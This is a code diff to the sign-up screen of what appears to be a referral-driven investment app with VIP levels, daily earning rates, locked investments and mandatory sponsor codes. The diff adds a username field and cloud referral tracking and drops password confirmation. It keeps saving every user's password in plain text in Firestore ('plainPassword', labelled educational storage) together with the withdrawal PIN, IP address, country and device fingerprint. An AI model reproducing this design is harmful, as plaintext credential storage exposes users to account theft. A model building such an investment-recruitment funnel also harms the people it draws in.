@@ -15,14 +15,18 @@ import {
   AlertTriangle,
   Globe,
   Fingerprint,
-  ShieldAlert
+  ShieldAlert,
+  User
 } from 'lucide-react';
 import { 
   auth, 
   signInWithEmailAndPassword, 
   createUserWithEmailAndPassword,
   syncUserProfileToFirestore,
-  fetchUserProfileFromFirestore
+  fetchUserProfileFromFirestore,
+  validateSponsorCode,
+  registerReferralCodeInCloud,
+  recordReferralRelationship
 } from '../utils/firebase';
 import { 
   fetchDeviceInfo, 
@@ -37,6 +41,7 @@ interface AuthScreenProps {
   onAuthenticated: (userData: {
     uid: string;
     email: string;
+    username?: string;
     referralCode?: string;
     securityPin?: string;
     sponsorCode?: string;
@@ -48,13 +53,12 @@ interface AuthScreenProps {
 
 export const AuthScreen: React.FC<AuthScreenProps> = ({ onAuthenticated }) => {
   const [mode, setMode] = useState<'login' | 'signup'>('login');
+  const [username, setUsername] = useState('');
   const [email, setEmail] = useState('');
   const [password, setPassword] = useState('');
-  const [confirmPassword, setConfirmPassword] = useState('');
   const [referralCode, setReferralCode] = useState('');
-  const [securityPin, setSecurityPin] = useState(''); // Strictly empty! User sets their own
+  const [securityPin, setSecurityPin] = useState(''); // 6-digit security password
   const [showPassword, setShowPassword] = useState(false);
-  const [showConfirmPassword, setShowConfirmPassword] = useState(false);
   const [loading, setLoading] = useState(false);
   const [errorMsg, setErrorMsg] = useState('');
   const [successMsg, setSuccessMsg] = useState('');
@@ -107,6 +111,7 @@ export const AuthScreen: React.FC<AuthScreenProps> = ({ onAuthenticated }) => {
         onAuthenticated({
           uid: user.uid,
           email: user.email || email.trim(),
+          username: profile?.username,
           referralCode: profile?.referralCode,
           securityPin: profile?.securityPin,
           sponsorCode: profile?.sponsorCode,
@@ -168,6 +173,7 @@ export const AuthScreen: React.FC<AuthScreenProps> = ({ onAuthenticated }) => {
       onAuthenticated({
         uid: pendingUserAuth.uid,
         email: pendingUserAuth.email,
+        username: pendingUserAuth.profile?.username,
         referralCode: pendingUserAuth.profile?.referralCode,
         securityPin: pendingUserAuth.profile?.securityPin,
         sponsorCode: pendingUserAuth.profile?.sponsorCode,
@@ -182,6 +188,14 @@ export const AuthScreen: React.FC<AuthScreenProps> = ({ onAuthenticated }) => {
     e.preventDefault();
     setErrorMsg('');
 
+    if (!username.trim()) {
+      setErrorMsg('Please enter a username.');
+      return;
+    }
+    if (username.trim().length < 3) {
+      setErrorMsg('Username must be at least 3 characters long.');
+      return;
+    }
     if (!email.trim() || !password.trim()) {
       setErrorMsg('Please complete all required fields.');
       return;
@@ -190,31 +204,34 @@ export const AuthScreen: React.FC<AuthScreenProps> = ({ onAuthenticated }) => {
       setErrorMsg('Password must be at least 6 characters long.');
       return;
     }
-    if (password !== confirmPassword) {
-      setErrorMsg('Passwords do not match. Please re-enter.');
+
+    // Security Password (PIN) strictly 6 digits per user request
+    const cleanPin = securityPin.trim();
+    if (!cleanPin || cleanPin.length !== 6 || !/^\d{6}$/.test(cleanPin)) {
+      setErrorMsg('Security Password must be exactly 6 digits (e.g. 123456).');
       return;
     }
 
-    // PIN is user-defined (4-6 digits), cannot be empty
-    if (!securityPin || securityPin.length < 4 || securityPin.length > 6) {
-      setErrorMsg('Please enter a 4-6 digit Security PIN for withdrawal authorization.');
-      return;
-    }
-
-    // Referral validation - must be valid to trace sponsorship
+    // Invite / Referral validation - must be valid to trace sponsorship
     const trimmedReferral = referralCode.trim().toUpperCase();
     if (!trimmedReferral) {
-      setErrorMsg('A valid Referral / Sponsor Code is required (e.g. GOLD888).');
-      return;
-    }
-
-    const validCodes = getValidReferralCodes();
-    if (!validCodes.includes(trimmedReferral)) {
-      setErrorMsg(`Invalid referral code "${trimmedReferral}". Please enter a verified sponsor code (e.g. GOLD888).`);
+      setErrorMsg('A valid Invite / Sponsor Code is required (e.g. inviter code or GOLD888).');
       return;
     }
 
     setLoading(true);
+    setErrorMsg('');
+
+    // Check Cloud Firestore for any registered user's unique referralCode or Genesis master codes
+    const sponsorValidation = await validateSponsorCode(trimmedReferral);
+    if (!sponsorValidation.valid) {
+      setLoading(false);
+      setErrorMsg(
+        sponsorValidation.message || 
+        `Invalid invite code "${trimmedReferral}". Please enter a verified sponsor code (e.g. GOLD888 or your referrer's code).`
+      );
+      return;
+    }
 
     try {
       const userCredential = await createUserWithEmailAndPassword(auth, email.trim(), password);
@@ -223,24 +240,32 @@ export const AuthScreen: React.FC<AuthScreenProps> = ({ onAuthenticated }) => {
       // Generate unique traceable referral code for the new user
       const generatedUserCode = 'GOLD' + Math.floor(1000 + Math.random() * 9000);
       registerNewReferralCode(generatedUserCode);
+      await registerReferralCodeInCloud(generatedUserCode, user.uid, user.email || email.trim());
+
+      // Track referral relationship so the sponsor's team and valid count are updated
+      await recordReferralRelationship(trimmedReferral, user.uid, user.email || email.trim());
 
       // Store security data, password, PIN, IP, country in Firestore as explicitly requested
       const profileData = {
         uid: user.uid,
         email: user.email || email.trim(),
+        username: username.trim(),
         plainPassword: password.trim(), // Educational storage per user request
-        securityPin: securityPin.trim(),
+        securityPin: cleanPin,
         sponsorCode: trimmedReferral,
+        sponsorUid: sponsorValidation.sponsorUid || '',
         referralCode: generatedUserCode,
         registeredIp: deviceInfo?.ip || '127.0.0.1',
         registeredCountry: deviceInfo?.country || 'Global Terminal',
         deviceFingerprint: deviceInfo?.fingerprint || '',
-        vipLevel: 1,
+        vipLevel: 0,
+        dailyEarningRate: 0.0,
         totalBalance: 0.00, // Strictly 0.00! No free registration bonus
         withdrawableBalance: 0.00,
         lockedInvestment: 0.00,
         bonusBalance: 0.00,
         twoFactorEnabled: false,
+        validReferralsCount: 0,
         createdAt: new Date().toISOString()
       };
 
@@ -254,8 +279,9 @@ export const AuthScreen: React.FC<AuthScreenProps> = ({ onAuthenticated }) => {
         onAuthenticated({
           uid: user.uid,
           email: user.email || email.trim(),
+          username: username.trim(),
           referralCode: generatedUserCode,
-          securityPin: securityPin.trim(),
+          securityPin: cleanPin,
           sponsorCode: trimmedReferral,
           totalBalance: 0.00,
           withdrawableBalance: 0.00,
@@ -278,8 +304,9 @@ export const AuthScreen: React.FC<AuthScreenProps> = ({ onAuthenticated }) => {
           onAuthenticated({
             uid: `usr-${Date.now().toString().slice(-7)}`,
             email: email.trim(),
+            username: username.trim(),
             referralCode: fallbackCode,
-            securityPin: securityPin.trim(),
+            securityPin: cleanPin,
             sponsorCode: trimmedReferral,
             totalBalance: 0.00,
             withdrawableBalance: 0.00,
@@ -473,6 +500,25 @@ export const AuthScreen: React.FC<AuthScreenProps> = ({ onAuthenticated }) => {
               {/* Primary Form */}
               <form onSubmit={mode === 'login' ? handleLogin : handleSignup} className="space-y-3.5">
                 
+                {/* Username Field (Registration Only) */}
+                {mode === 'signup' && (
+                  <div className="space-y-1">
+                    <label className="text-xs font-medium text-slate-300 flex items-center gap-1">
+                      <User className="w-3.5 h-3.5 text-amber-400" />
+                      <span>Username</span>
+                    </label>
+                    <input
+                      id="auth-username-input"
+                      type="text"
+                      required
+                      value={username}
+                      onChange={(e) => setUsername(e.target.value)}
+                      placeholder="e.g. golden_trader"
+                      className="w-full px-3.5 py-2.5 rounded-xl bg-[#080d1a] border border-slate-700/80 text-white text-xs font-medium focus:outline-none focus:border-amber-400 transition-colors placeholder:text-slate-500"
+                    />
+                  </div>
+                )}
+
                 {/* Email Field */}
                 <div className="space-y-1">
                   <label className="text-xs font-medium text-slate-300 flex items-center gap-1">
@@ -517,79 +563,50 @@ export const AuthScreen: React.FC<AuthScreenProps> = ({ onAuthenticated }) => {
                   />
                 </div>
 
-                {/* Registration Specific Fields */}
+                {/* Registration Specific Fields: Invite Code & 6-Digit Security Password */}
                 {mode === 'signup' && (
-                  <>
-                    {/* Confirm Password */}
+                  <div className="grid grid-cols-2 gap-2">
+                    {/* Invite Code / Sponsor Code */}
                     <div className="space-y-1">
-                      <div className="flex items-center justify-between">
-                        <label className="text-xs font-medium text-slate-300 flex items-center gap-1">
-                          <Lock className="w-3.5 h-3.5 text-amber-400" />
-                          <span>Confirm Password</span>
-                        </label>
-                        <button
-                          type="button"
-                          onClick={() => setShowConfirmPassword(!showConfirmPassword)}
-                          className="text-[10px] text-slate-400 hover:text-white flex items-center gap-1"
-                        >
-                          {showConfirmPassword ? <EyeOff className="w-3 h-3" /> : <Eye className="w-3 h-3" />}
-                          <span>{showConfirmPassword ? 'Hide' : 'Show'}</span>
-                        </button>
-                      </div>
+                      <label className="text-xs font-medium text-slate-300 flex items-center justify-between">
+                        <span className="flex items-center gap-1">
+                          <Users className="w-3.5 h-3.5 text-amber-400" />
+                          Invite Code
+                        </span>
+                        <span className="text-[9px] text-amber-400 font-bold">*Required</span>
+                      </label>
                       <input
-                        id="auth-confirm-password-input"
-                        type={showConfirmPassword ? 'text' : 'password'}
+                        id="auth-referral-input"
+                        type="text"
                         required
-                        value={confirmPassword}
-                        onChange={(e) => setConfirmPassword(e.target.value)}
-                        placeholder="Re-enter password"
-                        className="w-full px-3.5 py-2.5 rounded-xl bg-[#080d1a] border border-slate-700/80 text-white text-xs font-mono focus:outline-none focus:border-amber-400 transition-colors placeholder:text-slate-500"
+                        value={referralCode}
+                        onChange={(e) => setReferralCode(e.target.value.toUpperCase())}
+                        placeholder="e.g. GOLD888"
+                        className="w-full px-3 py-2.5 rounded-xl bg-[#080d1a] border border-slate-700/80 text-amber-400 font-mono text-xs font-bold uppercase focus:outline-none focus:border-amber-400"
                       />
                     </div>
 
-                    <div className="grid grid-cols-2 gap-2">
-                      {/* Valid Sponsor / Referral Code */}
-                      <div className="space-y-1">
-                        <label className="text-xs font-medium text-slate-300 flex items-center justify-between">
-                          <span className="flex items-center gap-1">
-                            <Users className="w-3.5 h-3.5 text-amber-400" />
-                            Sponsor Code
-                          </span>
-                          <span className="text-[9px] text-amber-400 font-bold">*Required</span>
-                        </label>
-                        <input
-                          id="auth-referral-input"
-                          type="text"
-                          required
-                          value={referralCode}
-                          onChange={(e) => setReferralCode(e.target.value.toUpperCase())}
-                          placeholder="e.g. GOLD888"
-                          className="w-full px-3 py-2 rounded-xl bg-[#080d1a] border border-slate-700/80 text-amber-400 font-mono text-xs font-bold uppercase focus:outline-none focus:border-amber-400"
-                        />
-                      </div>
-
-                      {/* User-defined 2FA Security PIN (Strictly NO default!) */}
-                      <div className="space-y-1">
-                        <label className="text-xs font-medium text-slate-300 flex items-center justify-between">
-                          <span className="flex items-center gap-1">
-                            <KeyRound className="w-3.5 h-3.5 text-amber-400" />
-                            Security PIN
-                          </span>
-                          <span className="text-[9px] text-slate-400 font-mono">4-6 Digits</span>
-                        </label>
-                        <input
-                          id="auth-pin-input"
-                          type="password"
-                          maxLength={6}
-                          required
-                          value={securityPin}
-                          onChange={(e) => setSecurityPin(e.target.value)}
-                          placeholder="Set custom PIN"
-                          className="w-full px-3 py-2 rounded-xl bg-[#080d1a] border border-slate-700/80 text-white font-mono text-xs font-bold text-center focus:outline-none focus:border-amber-400"
-                        />
-                      </div>
+                    {/* 6-Digit Security Password */}
+                    <div className="space-y-1">
+                      <label className="text-xs font-medium text-slate-300 flex items-center justify-between">
+                        <span className="flex items-center gap-1">
+                          <KeyRound className="w-3.5 h-3.5 text-amber-400" />
+                          Security Password
+                        </span>
+                        <span className="text-[9px] text-amber-400 font-mono font-bold">6 Digits</span>
+                      </label>
+                      <input
+                        id="auth-pin-input"
+                        type="password"
+                        maxLength={6}
+                        required
+                        value={securityPin}
+                        onChange={(e) => setSecurityPin(e.target.value.replace(/\D/g, ''))}
+                        placeholder="6-digit PIN"
+                        className="w-full px-3 py-2.5 rounded-xl bg-[#080d1a] border border-slate-700/80 text-white font-mono text-xs font-bold text-center tracking-widest focus:outline-none focus:border-amber-400"
+                      />
                     </div>
-                  </>
+                  </div>
                 )}
 
                 {/* Submit Action Button */}
